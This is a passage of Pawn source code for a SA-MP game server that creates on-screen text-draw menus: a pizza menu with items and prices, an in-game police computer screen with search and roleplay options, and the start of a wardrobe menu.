		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 10 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 10 ], 255);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 10 ], 221.000000, 140.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 10 ], 1);
		PlayerTextDrawSetPreviewModel( playerid, PizzaMenu[ playerid ][ 10 ], 2219);
		PlayerTextDrawSetPreviewRot( playerid, PizzaMenu[ playerid ][ 10 ], 10.0, -10.0, 220.0, 1.0);

		PizzaMenu[ playerid ][ 11 ] = CreatePlayerTextDraw(playerid, 439.000000, 114.000000, "Margarita~n~coca cola~n~pomfrit");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 11 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 11 ], 2);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 11 ], 0.219999, 0.899999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 11 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 11 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 11 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 11 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 11 ], 0);

		PizzaMenu[ playerid ][ 12 ] = CreatePlayerTextDraw(playerid, 463.000000, 154.000000, "79.49 $");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 12 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 12 ], 3);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 12 ], 0.470000, 1.799999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 12 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 12 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 12 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 12 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 12 ], 0);

		PizzaMenu[ playerid ][ 13 ] = CreatePlayerTextDraw(playerid, 101.000000, 132.000000, "3");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 13 ], 0);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 13 ], 5);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 13 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 13 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 13 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 13 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 13 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 13 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 13 ], 255);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 13 ], 221.000000, 140.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 13 ], 1);
		PlayerTextDrawSetPreviewModel( playerid, PizzaMenu[ playerid ][ 13 ], 2220);
		PlayerTextDrawSetPreviewRot( playerid, PizzaMenu[ playerid ][ 13 ], 10.0, -10.0, 220.0, 1.0);

		PizzaMenu[ playerid ][ 14 ] = CreatePlayerTextDraw(playerid, 236.000000, 212.000000, "Siciliana~n~juice~n~pomfrit");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 14 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 14 ], 2);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 14 ], 0.219999, 0.899999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 14 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 14 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 14 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 14 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 14 ], 0);

		PizzaMenu[ playerid ][ 15 ] = CreatePlayerTextDraw(playerid, 232.000000, 258.000000, "80.99 $");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 15 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 15 ], 3);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 15 ], 0.470000, 1.799999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 15 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 15 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 15 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 15 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 15 ], 0);

		PizzaMenu[ playerid ][ 16 ] = CreatePlayerTextDraw(playerid, 314.000000, 132.000000, "4");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 16 ], 0);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 16 ], 5);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 16 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 16 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 16 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 16 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 16 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 16 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 16 ], 255);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 16 ], 221.000000, 140.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 16 ], 1);
		PlayerTextDrawSetPreviewModel( playerid, PizzaMenu[ playerid ][ 16 ], 2218);
		PlayerTextDrawSetPreviewRot( playerid, PizzaMenu[ playerid ][ 16 ], 10.0, -10.0, 220.0, 1.0);


		PizzaMenu[ playerid ][ 17 ] = CreatePlayerTextDraw(playerid, 436.000000, 212.000000, "Vesuvio~n~cedevita~n~pomfrit");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 17 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 17 ], 2);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 17 ], 0.219999, 0.899999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 17 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 17 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 17 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 17 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 17 ], 0);

		PizzaMenu[ playerid ][ 18 ] = CreatePlayerTextDraw(playerid, 462.000000, 258.000000, "89.49 $");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 18 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 18 ], 3);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 18 ], 0.470000, 1.799999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 18 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 18 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 18 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 18 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 18 ], 0);

		PizzaMenu[ playerid ][ 19 ] = CreatePlayerTextDraw(playerid, 101.000000, 243.000000, "5");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 19 ], 0);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 19 ], 5);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 19 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 19 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 19 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 19 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 19 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 19 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 19 ], 255);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 19 ], 221.000000, 140.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 19 ], 1);
		PlayerTextDrawSetPreviewModel( playerid, PizzaMenu[ playerid ][ 19 ], 2219);
		PlayerTextDrawSetPreviewRot( playerid, PizzaMenu[ playerid ][ 19 ], 0.0, -10.0, 220.0, 1.0);

		PizzaMenu[ playerid ][ 20 ] = CreatePlayerTextDraw(playerid, 236.000000, 324.000000, "Quattro stagione~n~juice~n~pomfrit");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 20 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 20 ], 2);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 20 ], 0.219999, 0.899999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 20 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 20 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 20 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 20 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 20 ], 0);

		PizzaMenu[ playerid ][ 21 ] = CreatePlayerTextDraw(playerid, 232.000000, 364.000000, "98.49 $");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 21 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 21 ], 3);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 21 ], 0.470000, 1.799999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 21 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 21 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 21 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 21 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 21 ], 0);

		PizzaMenu[ playerid ][ 22 ] = CreatePlayerTextDraw(playerid, 314.000000, 243.000000, "6");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 22 ], 0);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 22 ], 5);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 22 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 22 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 22 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 22 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 22 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 22 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 22 ], 255);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 22 ], 221.000000, 140.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 22 ], 1);
		PlayerTextDrawSetPreviewModel( playerid, PizzaMenu[ playerid ][ 22 ], 2220);
		PlayerTextDrawSetPreviewRot( playerid, PizzaMenu[ playerid ][ 22 ], 0.0, -10.0, 220.0, 1.0);

		PizzaMenu[ playerid ][ 23 ] = CreatePlayerTextDraw(playerid, 444.000000, 324.000000, "Napoletana~n~coca cola~n~pomfrit");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 23 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 23 ], 2);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 23 ], 0.219999, 0.899999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 23 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 23 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 23 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 23 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 23 ], 0);

		PizzaMenu[ playerid ][ 24 ] = CreatePlayerTextDraw(playerid, 455.000000, 364.000000, "108.49 $");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 24 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 24 ], 3);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 24 ], 0.470000, 1.799999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 24 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 24 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 24 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 24 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 24 ], 0);
		
		for( new i = 0; i < 25; i++) {
			PlayerTextDrawShow( playerid, PizzaMenu[ playerid ][ i ] );
		}
	}
	else if( show == false ) {
		for( new i = 0; i < 25; i ++) {
			PlayerTextDrawHide( playerid, PizzaMenu[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, PizzaMenu[ playerid ][ i ] );
			PizzaMenu[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
			CancelSelectTextDraw( playerid );
		}
	}
}

//------------------------------------------------------------------------------
stock Police_TVTDControl( playerid, bool:show ) {
	if( show == true ) {
	    Police_TV[ playerid ][ 0 ] = CreatePlayerTextDraw( playerid,28.000, 155.500, "LD_DRV:tvbase");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 0 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 0 ], 178.000, 169.000);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 0 ], SRVBOJA1);

	    Police_TV[ playerid ][ 1 ] = CreatePlayerTextDraw( playerid,23.500, 148.000, "LD_DUAL:tvcorn");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 1 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 1 ], 100.000, 100.000);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 1 ], -1);

	    Police_TV[ playerid ][ 2 ] = CreatePlayerTextDraw( playerid,209.500, 148.000, "LD_DRV:tvcorn");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 2 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 2 ], -99.500, 104.500);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 2 ], -1);

	    Police_TV[ playerid ][ 3 ] = CreatePlayerTextDraw( playerid,23.500, 329.500, "LD_DRV:tvcorn");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 3 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 3 ], 100.000, -104.000);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 3 ], -1);

	    Police_TV[ playerid ][ 4 ] = CreatePlayerTextDraw( playerid,209.500, 329.500, "LD_DRV:tvcorn");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 4 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 4 ], -98.000, -101.000);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 4 ], -1);

	    Police_TV[ playerid ][ 5 ] = CreatePlayerTextDraw( playerid,118.000000, 170.000000, "Police Computer");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 5 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 5 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 5 ], 2);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 5 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 5 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 5 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 5 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 5 ], 1);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 5 ], 0);

		Police_TV[ playerid ][ 6 ] = CreatePlayerTextDraw( playerid,115.000000, 177.000000, "-");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 6 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 6 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 6 ], 2);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 6 ], 14.970021, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 6 ], 16777215);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 6 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 6 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 6 ], 1);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 6 ], 0);

		Police_TV[ playerid ][ 7 ] = CreatePlayerTextDraw( playerid,98.000000, 201.000000, "-_Trazenje_po_imenu");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 7 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 7 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 7 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 7 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 7 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 7 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 7 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 7 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 7 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 7 ], 1);

		Police_TV[ playerid ][ 8 ] = CreatePlayerTextDraw( playerid,111.000000, 212.000000, "-_Trazenje_po_registraciji");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 8 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 8 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 8 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 8 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 8 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 8 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 8 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 8 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 8 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 8 ], 1);

		Police_TV[ playerid ][ 9 ] = CreatePlayerTextDraw( playerid,96.000000, 221.000000, "-_Popis_zatvorenika");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 9 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 9 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 9 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 9 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 9 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 9 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 9 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 9 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 9 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 9 ], 1);

		Police_TV[ playerid ][ 10 ] = CreatePlayerTextDraw( playerid,97.000000, 241.000000, "-_Popis_osumnjicenih");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 10 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 10 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 10 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 10 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 10 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 10 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 10 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 10 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 10 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 10 ], 1);

		Police_TV[ playerid ][ 11 ] = CreatePlayerTextDraw( playerid,88.000000, 231.000000, "-_Poziv_pojacanja");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 11 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 11 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 11 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 11 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 11 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 11 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 11 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 11 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 11 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 11 ], 1);

		Police_TV[ playerid ][ 12 ] = CreatePlayerTextDraw( playerid,78.000000, 251.000000, "-_Ocisti_dosije");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 12 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 12 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 12 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 12 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 12 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 12 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 12 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 12 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 12 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 12 ], 1);

		Police_TV[ playerid ][ 13 ] = CreatePlayerTextDraw( playerid,87.000000, 261.000000, "-_Postavi_poteru");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 13 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 13 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 13 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 13 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 13 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 13 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 13 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 13 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 13 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 13 ], 1);

	    for( new i = 0; i < 14; i++) {
			PlayerTextDrawShow( playerid, Police_TV[ playerid ][ i ] );
		}
    }
	else if( show == false ) {
		for( new i = 0; i < 14; i ++) {
			PlayerTextDrawHide( playerid, Police_TV[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Police_TV[ playerid ][ i ] );
			Police_TV[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
stock OrmarTDControl( playerid, bool:show ) {
	if( show == true ) {
	    Ormar[ playerid ][ 0 ] = CreatePlayerTextDraw( playerid,475.000000, 332.000000, "           ");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 0 ], SRVBOJA1);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 0 ], 1);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 0 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 0 ], -1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 0 ], 0);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 0 ], 1);
		PlayerTextDrawSetShadow( playerid,Ormar[ playerid ][ 0 ], 5);
		PlayerTextDrawUseBox( playerid,Ormar[ playerid ][ 0 ], 1);
		PlayerTextDrawBoxColor( playerid,Ormar[ playerid ][ 0 ], 100);
		PlayerTextDrawTextSize( playerid,Ormar[ playerid ][ 0 ], 139.000000, 10.000000);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 0 ], 0);

        Ormar[ playerid ][ 1 ] = CreatePlayerTextDraw( playerid,334.000000, 419.000000, "-");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 1 ], 255);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 1 ], 1);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 1 ], 10.220003, 1.000000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 1 ], SRVBOJA1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 1 ], 0);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 1 ], 1);
		PlayerTextDrawSetShadow( playerid,Ormar[ playerid ][ 1 ], 1);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 1 ], 0);

		Ormar[ playerid ][ 2 ] = CreatePlayerTextDraw( playerid,234.000000, 338.000000, "-");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 2 ], 255);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 2 ], 1);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 2 ], 10.220003, 1.000000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 2 ], SRVBOJA1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 2 ], 0);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 2 ], 1);
		PlayerTextDrawSetShadow( playerid,Ormar[ playerid ][ 2 ], 1);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 2 ], 0);

		Ormar[ playerid ][ 3 ] = CreatePlayerTextDraw( playerid,140.000000, 344.000000, "New Textdraw");
		PlayerTextDrawBackgroundColor( playerid,Ormar[ playerid ][ 3 ], 0);
		PlayerTextDrawFont( playerid,Ormar[ playerid ][ 3 ], 5);
		PlayerTextDrawLetterSize( playerid,Ormar[ playerid ][ 3 ], 0.0000, 0.0000);
		PlayerTextDrawColor( playerid,Ormar[ playerid ][ 3 ], -1);
		PlayerTextDrawSetOutline( playerid,Ormar[ playerid ][ 3 ], 1);
		PlayerTextDrawSetProportional( playerid,Ormar[ playerid ][ 3 ], 1);
		PlayerTextDrawUseBox( playerid,Ormar[ playerid ][ 3 ], 1);
		PlayerTextDrawBoxColor( playerid,Ormar[ playerid ][ 3 ], 255);
		PlayerTextDrawTextSize( playerid,Ormar[ playerid ][ 3 ], 103.000000, 80.000000);
		PlayerTextDrawSetPreviewModel( playerid, Ormar[ playerid ][ 3 ], 29);
		PlayerTextDrawSetPreviewRot( playerid, Ormar[ playerid ][ 3 ], 0.000000, 0.000000, 0.000000, 1.000000);
		PlayerTextDrawSetSelectable( playerid,Ormar[ playerid ][ 3 ], 1);

